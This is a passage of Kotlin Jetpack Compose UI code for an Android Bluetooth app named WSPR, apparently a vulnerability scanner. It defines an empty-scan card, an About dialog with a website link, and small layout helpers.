            .border(1.dp, MaterialTheme.colorScheme.secondary.copy(alpha = 0.3f), RoundedCornerShape(16.dp)),
        colors = CardDefaults.cardColors(containerColor = Color.Transparent),
        shape = RoundedCornerShape(16.dp)
    ) {
        Column(modifier = Modifier.fillMaxWidth().padding(32.dp), horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(if (isScanning) Icons.Default.BluetoothSearching else Icons.Default.BluetoothDisabled, null, tint = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f), modifier = Modifier.size(64.dp))
            Spacer(Modifier.height(16.dp))
            Text(if (isScanning) "Searching..." else "No devices", style = MaterialTheme.typography.titleMedium, color = MaterialTheme.colorScheme.onSurface, textAlign = TextAlign.Center)
            Text(if (isScanning) "Detector is up and running" else "Start scan to discover new devices", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f), textAlign = TextAlign.Center)
        }
    }
}

@Composable
fun BulletPoint(text: String) {
    Row(modifier = Modifier.padding(vertical = 2.dp)) {
        Text("• ", color = MaterialTheme.colorScheme.primary)
        Text(text, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurface)
    }
}

@Composable
fun AboutDialog(onDismiss: () -> Unit) {
    val uriHandler = LocalUriHandler.current
    val scrollState = rememberScrollState()

    AlertDialog(
        onDismissRequest = onDismiss,
        title = {
            Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
                Image(
                    painter = painterResource(R.drawable.iconpixl),
                    contentDescription = "WSPR",
                    modifier = Modifier.size(72.dp)
                )
                Spacer(Modifier.height(8.dp))
                Text("WSPR", fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.onSurface)
                Text("Vulnerability Scanner // Abhöreinrichung 5", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.secondary)
            }
        },
        text = {
            Column(modifier = Modifier.verticalScroll(scrollState)) {
                // Links
                SectionHeader("Links")
                LinkRow("WSPR Website", "https://feinlabs.de", uriHandler)
            }
        },
        confirmButton = {
            TextButton(onClick = onDismiss) {
                Text(
                    "CLOSE",
                    color = MaterialTheme.colorScheme.secondary,
                    fontFamily = FontFamily.Monospace,
                    fontSize = 12.sp
                )
            }
        },
        containerColor = MaterialTheme.colorScheme.surface
    )
}

@Composable
fun SectionHeader(text: String) {
    Text(text, style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.onSurface)
    Spacer(Modifier.height(4.dp))
}

@Composable
fun LinkRow(text: String, url: String, uriHandler: androidx.compose.ui.platform.UriHandler) {
    Row(modifier = Modifier.fillMaxWidth().clickable { uriHandler.openUri(url) }.padding(vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
        Icon(Icons.Default.OpenInNew, null, tint = MaterialTheme.colorScheme.secondary, modifier = Modifier.size(14.dp))
        Spacer(Modifier.width(8.dp))
        Text(text, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.secondary)
    }
}
